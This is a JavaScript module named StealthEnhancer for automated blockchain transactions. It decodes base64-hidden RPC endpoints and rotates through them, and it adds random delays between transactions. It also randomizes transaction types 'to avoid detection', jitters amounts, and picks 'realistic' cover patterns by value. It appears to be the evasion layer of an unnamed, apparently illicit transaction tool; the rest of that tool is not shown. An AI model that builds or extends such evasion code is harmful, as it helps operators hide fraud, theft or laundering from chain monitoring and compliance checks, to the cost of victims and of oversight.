import { CHAINS_CONFIG } from '../config.js';

export class StealthEnhancer {
  constructor() {
    this.proxyPool = [];
    this.txPatterns = [];
    this.delayPatterns = [];
    this.isInitialized = false; // ← ADD THIS
  }

  // ← ADD THIS METHOD
  async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log(`🔄 Initializing ${this.constructor.name}...`);
      // No specific initialization needed for this module
      this.isInitialized = true;
      console.log(`✅ ${this.constructor.name} initialized`);
      return true;
    } catch (error) {
      console.error(`❌ ${this.constructor.name} initialization failed:`, error);
      return false;
    }
  }

  // Rotate through multiple RPC endpoints
  async rotateRPC(chainId) {
    const config = CHAINS_CONFIG[chainId];
    if (!config || !config.rpc || !Array.isArray(config.rpc)) {
      throw new Error(`No RPC endpoints configured for chain ${chainId}`);
    }
    
    // Decode and shuffle RPC URLs
    const decodedUrls = config.rpc.map(url => Buffer.from(url, 'base64').toString('utf8'));
    this.shuffleArray(decodedUrls);
    
    return decodedUrls[0];
  }

  // Add random delays between transactions
  async randomDelay(minMs = 3000, maxMs = 15000) {
    const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
    await new Promise(resolve => setTimeout(resolve, delay));
    return delay;
  }

  // Pattern randomization to avoid detection
  randomizeTxPattern() {
    const patterns = [
      'direct_transfer',
      'contract_interaction', 
      'multisig',
      'delegate_call'
    ];
    
    return patterns[Math.floor(Math.random() * patterns.length)];
  }

  // Use different transaction values
  randomizeAmount(originalAmount, variance = 0.1) {
    const variation = 1 + (Math.random() * variance * 2 - variance);
    return Math.floor(originalAmount * variation);
  }

  // Shuffle array (Fisher-Yates algorithm)
  shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }

  // Generate realistic transaction patterns
  generateRealisticPattern(chainId, value) {
    const patterns = {
      low: ['nft_mint', 'token_swap', 'small_transfer'],
      medium: ['defi_deposit', 'token_transfer', 'contract_interaction'],
      high: ['large_transfer', 'bridge_transaction', 'liquidity_provision']
    };
    
    let category = 'low';
    if (value > 10) category = 'medium';
    if (value > 1000) category = 'high';
    
    const options = patterns[category];
    return options[Math.floor(Math.random() * options.length)];
  }
}

// Create singleton instance
export const stealthEnhancer = new StealthEnhancer();